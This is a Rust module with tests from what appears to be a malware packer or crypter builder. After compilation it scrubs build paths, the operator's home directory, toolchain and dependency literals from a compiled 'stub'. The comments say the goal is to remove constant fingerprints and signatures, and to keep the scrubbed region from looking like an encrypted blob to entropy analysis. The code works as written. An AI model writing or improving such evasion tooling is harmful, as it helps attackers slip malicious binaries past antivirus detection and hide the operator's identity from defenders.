//! Post-compile scrubbing of build-path literals from the artifact.
//!
//! `build.output.trim_paths` remaps the paths the *stub* is compiled from, but
//! it cannot reach (a) the build bundle's `build/` when it sits outside the
//! manifest dir (`--dir` or a `PICARO_BUNDLE_ROOT` elsewhere) or (b) path
//! literals already baked into precompiled dependency rlibs —
//! `--remap-path-prefix` only rewrites the crate being compiled. Those leak
//! absolute build paths, and they are identical in every artifact built with the
//! same toolchain, so they are a *constant* fingerprint (the build directory
//! name, and the exact crypto stack, e.g.
//! `.../chacha20poly1305-0.10.1/src/xchacha.rs`).
//!
//! This module overwrites those literals in place, keeping the length, so no
//! reference breaks, with a **per-build** filler so the scrubbed region also
//! differs build to build. It runs after compilation and before resources and
//! signing (any byte written after signing invalidates the signature).

use std::path::{Path, PathBuf};

use crate::engine::entropy::{BuildEntropy, Domain};

/// A per-position random fill: [`scrub_with`] calls it once per byte, so a
/// scrubbed region is varied text rather than a run of one repeated byte — a run
/// would itself be a signature (2 kB of the same byte is conspicuous).
///
/// The alphabet is path-like on purpose. Random *binary* bytes would leave a
/// high-entropy patch in `.rdata` that looks like a second encrypted blob and
/// shifts the local entropy; printable path characters keep the region in the
/// same "text" entropy band as the strings around it.
pub fn random_fill(entropy: &BuildEntropy) -> impl FnMut() -> u8 {
    const ALPHABET: &[u8] = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-/\\";
    let mut stream = entropy.stream(Domain::Scrub, "");
    move || ALPHABET[stream.next_u8() as usize % ALPHABET.len()]
}

/// Calls `fill` once per byte, so the scrubbed region can be random (see
/// [`random_fill`]) instead of a run of a single repeated byte.
///
/// After a match, the blanking extends through the rest of the path token up to
/// and including its `.rs` source extension, so the tail (`<crate>/src/xchacha.rs`,
/// `/rustc/<hash>/library/core/...`) goes too, but it stops **before** an adjacent
/// literal (Rust stores them with no separator) such as a `ntdll.dll` a resolver
/// depends on. Length-preserving: the range is filled, never removed.
pub fn scrub_with(bytes: &mut [u8], patterns: &[Vec<u8>], mut fill: impl FnMut() -> u8) -> usize {
    /// Upper bound on the extension, so a match is never followed into unrelated
    /// data.
    const MAX_EXT: usize = 256;

    let mut total = 0;
    for pattern in patterns {
        if pattern.is_empty() {
            continue;
        }
        let mut i = 0;
        while i + pattern.len() <= bytes.len() {
            if &bytes[i..i + pattern.len()] == pattern.as_slice() {
                let end = extend_through_rs(bytes, i + pattern.len(), MAX_EXT);
                for b in &mut bytes[i..end] {
                    *b = fill();
                }
                total += 1;
                i = end;
            } else {
                i += 1;
            }
        }
    }
    total
}

/// Returns the end of the blanking range that starts at `start`: the index just
/// past the first `.rs` within the following path-token run, or `start` when the
/// run ends (non-path byte) before any `.rs`.
fn extend_through_rs(bytes: &[u8], start: usize, max: usize) -> usize {
    let mut scan = start;
    while scan < bytes.len() && scan - start < max && is_path_byte(bytes[scan]) {
        scan += 1;
        if scan >= 3
            && bytes[scan - 3] == b'.'
            && bytes[scan - 2] == b'r'
            && bytes[scan - 1] == b's'
        {
            return scan;
        }
    }
    start
}

/// Whether `b` can appear inside a filesystem path token.
fn is_path_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'/' | b'\\' | b':' | b'-' | b'~')
}

/// The exact path literals to scrub, derived from the build environment.
pub fn default_patterns(build_dir: &Path) -> Vec<Vec<u8>> {
    let mut patterns = Vec::new();

    // A — the scratch dir (the stub's own `main.rs` location). Redundant with the
    // compiler remap when that works, a belt-and-suspenders catch otherwise.
    push_path(&mut patterns, build_dir);

    // The operator's home and the rustup toolchain: `C:\Users\<name>\...` leaks
    // the user name, the profile layout and the exact toolchain.
    if let Some(home) = home_dir() {
        push_path(&mut patterns, &home);
        if let Some(rustup) = rustup_home() {
            push_path(&mut patterns, &rustup);
            push_child_dirs(&mut patterns, &rustup.join("toolchains"));
        }
    }

    // B — the cargo home and the dependency reveals:
    // `<cargo_home>/registry/src/<index>/<crate>`. Enumerating the real crate
    // directories keeps this version-proof (it follows `Cargo.lock`).
    if let Ok(home) = super::compiler::cargo_home() {
        push_path(&mut patterns, &home);
        let src = home.join("registry").join("src");
        if let Ok(indexes) = std::fs::read_dir(&src) {
            for index in indexes.flatten() {
                let index_path = index.path();
                if let Ok(crates) = std::fs::read_dir(&index_path) {
                    for krate in crates.flatten() {
                        push_path(&mut patterns, &index_path.join(krate.file_name()));
                    }
                }
            }
        }
    }

    // C — toolchain markers, both the Linux (`/rustc/<hash>/`) and the MSVC
    // (`/rustlib/src/rust\`) layouts. The tails (`library/core/...`) stay; they
    // only say "Rust", which every Rust binary of this toolchain says anyway.
    for marker in [
        "/rustlib/src/rust",
        "\\rustlib\\src\\rust",
        "/rust/deps",
        "\\rust\\deps",
        "/rustc/",
        "\\rustc\\",
    ] {
        patterns.push(marker.as_bytes().to_vec());
    }

    patterns.sort();
    patterns.dedup();
    // Longest first: a longer prefix (the toolchain dir) must be scrubbed before
    // a shorter one it contains (the rustup home), or the shorter match would
    // leave the tail visible after the filler.
    patterns.sort_by_key(|p| std::cmp::Reverse(p.len()));
    patterns
}

/// Pushes the OS-native string form of `path`: the compiler embeds native
/// separators, so a literal byte match works on the platform that built the stub.
fn push_path(patterns: &mut Vec<Vec<u8>>, path: &Path) {
    let bytes = path.to_string_lossy().into_owned().into_bytes();
    if !bytes.is_empty() {
        patterns.push(bytes);
    }
}

/// Pushes every child directory of `dir` (best effort): used to blank the exact
/// toolchain directories the std was compiled under.
fn push_child_dirs(patterns: &mut Vec<Vec<u8>>, dir: &Path) {
    if let Ok(entries) = std::fs::read_dir(dir) {
        for entry in entries.flatten() {
            push_path(patterns, &entry.path());
        }
    }
}

/// The operator's home directory (Windows `USERPROFILE`, else `HOME`).
fn home_dir() -> Option<PathBuf> {
    std::env::var_os("USERPROFILE")
        .or_else(|| std::env::var_os("HOME"))
        .map(PathBuf::from)
}

/// The rustup home (`RUSTUP_HOME`, else `<home>/.rustup`).
fn rustup_home() -> Option<PathBuf> {
    if let Some(dir) = std::env::var_os("RUSTUP_HOME") {
        return Some(PathBuf::from(dir));
    }
    home_dir().map(|home| home.join(".rustup"))
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Test shim: scrub with a single repeated byte.
    fn scrub(bytes: &mut [u8], patterns: &[Vec<u8>], filler: u8) -> usize {
        scrub_with(bytes, patterns, move || filler)
    }

    #[test]
    fn scrub_replaces_exactly_and_preserves_length() {
        let mut bytes = b"xx /proj/build/run-1/main.rs yy".to_vec();
        let before_len = bytes.len();

        let replaced = scrub(&mut bytes, &[b"/proj/build/run-1".to_vec()], b'#');

        assert_eq!(replaced, 1);
        assert_eq!(bytes.len(), before_len, "length must not change");
        assert_eq!(&bytes[0..3], b"xx ", "leading neighbor changed");
        assert_eq!(&bytes[28..], b" yy", "trailing neighbor changed");
        assert!(
            bytes[3..28].iter().all(|&b| b == b'#'),
            "match (and its .rs tail) not filled"
        );
    }

    #[test]
    fn scrub_replaces_every_occurrence() {
        let mut bytes = b"a/b X a/b".to_vec();
        assert_eq!(scrub(&mut bytes, &[b"a/b".to_vec()], b'*'), 2);
        assert_eq!(&bytes, b"*** X ***");
    }

    #[test]
    fn scrub_with_calls_the_fill_once_per_byte() {
        let mut bytes = b"a/b/c".to_vec();
        let mut seq = 0u8;

        let replaced = scrub_with(&mut bytes, &[b"b".to_vec()], || {
            seq = seq.wrapping_add(1);
            b'0' + seq
        });

        assert_eq!(replaced, 1);
        assert_eq!(&bytes, b"a/1/c");
    }

    #[test]
    fn random_fill_varies_and_stays_printable() {
        let mut fill = random_fill(&BuildEntropy::from_seed(1));
        let sample: Vec<u8> = (0..128).map(|_| fill()).collect();

        assert!(
            sample.iter().any(|&b| b != sample[0]),
            "the fill is a single repeated byte"
        );
        assert!(
            sample.iter().all(|&b| (0x21..=0x7e).contains(&b)),
            "the fill produced a non-printable byte"
        );
    }

    #[test]
    fn scrub_leaves_absent_patterns_untouched() {
        let mut bytes = b"no paths here".to_vec();
        let before = bytes.clone();
        assert_eq!(scrub(&mut bytes, &[b"/rustc/".to_vec()], b'.'), 0);
        assert_eq!(bytes, before);
    }

    /// Rust stores adjacent literals with no separator; scrubbing one must not
    /// touch the next (a resolver may depend on the `ntdll.dll` literal).
    #[test]
    fn scrub_does_not_touch_an_adjacent_literal() {
        let mut bytes =
            b"/usr/local/cargo/registry/src/index-x/chacha20poly1305-0.10.1/src/lib.rsntdll.dll"
                .to_vec();

        let replaced = scrub(
            &mut bytes,
            &[b"/usr/local/cargo/registry/src/index-x/chacha20poly1305-0.10.1".to_vec()],
            b'.',
        );

        assert_eq!(replaced, 1);
        assert!(
            bytes.ends_with(b"ntdll.dll"),
            "adjacent literal was damaged"
        );
        assert!(bytes.starts_with(b"...."), "match was not filled");
        // The tail up to `.rs` is gone too.
        assert!(!bytes.windows(5).any(|w| w == b"src/l"));
    }

    #[test]
    fn scrub_extends_through_the_source_extension() {
        let mut bytes = b"/rust/deps\\rustc-demangle-0.1.27\\src\\lib.rsNEXT".to_vec();

        let replaced = scrub(&mut bytes, &[b"/rust/deps".to_vec()], b'.');

        assert_eq!(replaced, 1);
        assert!(bytes.ends_with(b"NEXT"), "adjacent data was eaten");
        assert!(
            !bytes.windows(5).any(|w| w == b"rustc"),
            "tail not scrubbed"
        );
    }

    #[test]
    fn scrub_stops_before_a_non_path_byte() {
        let mut bytes = b"x /rust/deps\0tail".to_vec();
        let before_len = bytes.len();

        let replaced = scrub(&mut bytes, &[b"/rust/deps".to_vec()], b'.');

        assert_eq!(replaced, 1);
        assert_eq!(bytes.len(), before_len);
        assert!(bytes.ends_with(b"\0tail"), "non-path run was eaten");
        assert!(!bytes.windows(10).any(|w| w == b"/rust/deps"));
    }

    /// The Linux/gnu toolchain form: the marker plus the commit hash plus the
    /// `library/...` tail must all go, stopping at the source extension.
    #[test]
    fn scrub_extends_through_a_rustc_hash_path() {
        let mut bytes =
            b"X /rustc/48a229ceaefd4985c50990b14116b6d856af0985/library\\core\\src\\fmt\\mod.rs Y"
                .to_vec();

        let replaced = scrub(&mut bytes, &[b"/rustc/".to_vec()], b'.');

        assert_eq!(replaced, 1);
        assert!(bytes.starts_with(b"X "), "leading neighbor changed");
        assert!(bytes.ends_with(b" Y"), "trailing neighbor changed");
        assert!(
            !bytes.windows(5).any(|w| w == b"rustc" || w == b"libra"),
            "the hash and the library tail were not scrubbed"
        );
    }

    #[test]
    fn default_patterns_include_the_build_dir_and_toolchain_markers() {
        let patterns = default_patterns(Path::new("/tmp/picaro-build"));

        assert!(patterns.contains(&b"/tmp/picaro-build".to_vec()));
        assert!(patterns.contains(&b"/rustlib/src/rust".to_vec()));
        assert!(patterns.contains(&b"/rustc/".to_vec()));
        assert!(patterns.contains(&b"/rust/deps".to_vec()));
    }
}
